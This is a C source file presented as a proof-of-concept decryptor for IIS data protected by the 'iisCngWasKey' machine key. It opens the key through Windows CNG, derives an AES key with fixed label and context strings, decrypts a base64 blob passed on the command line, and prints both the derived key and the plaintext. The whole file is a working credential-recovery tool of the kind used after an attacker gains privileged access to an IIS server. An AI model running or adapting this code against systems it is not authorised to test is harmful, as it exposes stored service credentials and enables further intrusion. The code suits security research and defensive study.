#include <stdio.h>
#include <windows.h>
#include <bcrypt.h>
#include <ncrypt.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

static const unsigned char base64_table[65] =
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// https://web.mit.edu/freebsd/head/contrib/wpa/src/utils/base64.c
unsigned char* base64Decode(const unsigned char* src,
	size_t* out_len)
{
	size_t len = strlen((char*)src);
	unsigned char dtable[256], * out, * pos, block[4], tmp;
	size_t i, count, olen;
	int pad = 0;

	memset(dtable, 0x80, 256);
	for (i = 0; i < sizeof(base64_table) - 1; i++)
		dtable[base64_table[i]] = (unsigned char)i;
	dtable['='] = 0;

	count = 0;
	for (i = 0; i < len; i++) {
		if (dtable[src[i]] != 0x80)
			count++;
	}

	if (count == 0 || count % 4)
		return NULL;

	olen = count / 4 * 3;
	pos = out = (unsigned char*)malloc(olen);
	if (out == NULL)
		return NULL;

	count = 0;
	for (i = 0; i < len; i++) {
		tmp = dtable[src[i]];
		if (tmp == 0x80)
			continue;

		if (src[i] == '=')
			pad++;
		block[count] = tmp;
		count++;
		if (count == 4) {
			*pos++ = (block[0] << 2) | (block[1] >> 4);
			*pos++ = (block[1] << 4) | (block[2] >> 2);
			*pos++ = (block[2] << 6) | block[3];
			count = 0;
			if (pad) {
				if (pad == 1)
					pos--;
				else if (pad == 2)
					pos -= 2;
				else {
					/* Invalid padding */
					free(out);
					return NULL;
				}
				break;
			}
		}
	}

	*out_len = pos - out;
	return out;
}

int main(int argc, char** argv)
{
	// Base64 decode the encrypted data
	size_t encryptedDataSize;
	unsigned char* encryptedDataDecoded;
	NCRYPT_PROV_HANDLE storageProvider;
	NCRYPT_KEY_HANDLE keyHandle;
	SECURITY_STATUS status;
	BCRYPT_ALG_HANDLE aesAlgHandle;
	BCryptBufferDesc bufferDesc;
	BCryptBuffer* buffer;
	DWORD blockLength;
	DWORD dwDataLen;
	BCRYPT_KEY_HANDLE symmKey;
	UCHAR derivedKey[32];
	DWORD derivedKeyOutput = 0;

	printf("IIS iisCngWasKey Decryptor POC by @_xpn_\n");

	encryptedDataDecoded = base64Decode((unsigned char*)argv[1], &encryptedDataSize);
	if (!encryptedDataDecoded || encryptedDataSize == 0) {
		printf("[!] Error decoding base64 data\n");
		return 1;
	}

	status = NCryptOpenStorageProvider(&storageProvider, NULL, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error opening storage provider: %x\n", status);
		return 1;
	}

	// Open the key storage provider
	status = NCryptOpenKey(storageProvider, &keyHandle, L"iisCngWasKey", 0, NCRYPT_MACHINE_KEY_FLAG);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error opening key storage provider: %x\n", status);
		return 1;
	}

	// Create derived key
	bufferDesc.ulVersion = BCRYPTBUFFER_VERSION;
	bufferDesc.cBuffers = 3;
	bufferDesc.pBuffers = (BCryptBuffer*)malloc(sizeof(BCryptBuffer) * 3);
	if (bufferDesc.pBuffers == NULL) {
		printf("[!] Error allocating memory");
		return 1;
	}

	buffer = bufferDesc.pBuffers;
	buffer[0].BufferType = KDF_LABEL;
	buffer[0].cbBuffer = 0x20;
	buffer[0].pvBuffer = (PVOID)L"EncryptionLabel\0";

	buffer[1].BufferType = KDF_CONTEXT;
	buffer[1].cbBuffer = 0x24;
	buffer[1].pvBuffer = (PVOID)L"EncryptionContext\0";

	buffer[2].BufferType = KDF_HASH_ALGORITHM;
	buffer[2].cbBuffer = 0xe;
	buffer[2].pvBuffer = (PVOID)L"SHA256";

	status = NCryptKeyDerivation(keyHandle, &bufferDesc, (PUCHAR)derivedKey, 32, &derivedKeyOutput, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error deriving key: %x\n", status);
		return 1;
	}
	free(buffer);

	printf("[*] Derived Key is: ");
	for (int i = 0; i < derivedKeyOutput; i++)
	{
		printf("%02x", derivedKey[i]);
	}
	printf("\n");

	status = BCryptOpenAlgorithmProvider(&aesAlgHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error opening algorithm provider: %x\n", status);
		return 1;
	}

	status = BCryptGetProperty(aesAlgHandle, BCRYPT_BLOCK_LENGTH, (PBYTE)&blockLength, sizeof(DWORD), &dwDataLen, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error getting block length: %x\n", status);
		return 1;
	}

	status = BCryptGenerateSymmetricKey(aesAlgHandle, &symmKey, NULL, 0, derivedKey, derivedKeyOutput, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error generating symmetric key: %x\n", status);
		return 1;
	}

	// Decrypt data
	// First 16 bytes of decoded are IV, then SHA256, then the encrypted blob
	status = BCryptDecrypt(symmKey, (PBYTE)encryptedDataDecoded + 16 + 32, encryptedDataSize - 16 - 32, NULL, encryptedDataDecoded, 16, NULL, 0, &dwDataLen, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error getting decrypted data length: %x\n", status);
		return 1;
	}

	PBYTE pbData = (PBYTE)malloc(dwDataLen);
	status = BCryptDecrypt(symmKey, (PBYTE)encryptedDataDecoded + 16 + 32, encryptedDataSize - 16 - 32, NULL, encryptedDataDecoded, 16, pbData, dwDataLen, &dwDataLen, 0);
	if (status != ERROR_SUCCESS)
	{
		printf("[!] Error getting decrypted data: %x\n", status);
		return 1;
	}

	// Print decrypted data
	printf("[*] Decrypted data: %ls\n", (wchar_t*)pbData);

	// Free up 
	NCryptFreeObject(storageProvider);
	BCryptCloseAlgorithmProvider(aesAlgHandle, 0);
	NCryptFreeObject(keyHandle);

	free(pbData);
	free(encryptedDataDecoded);
}
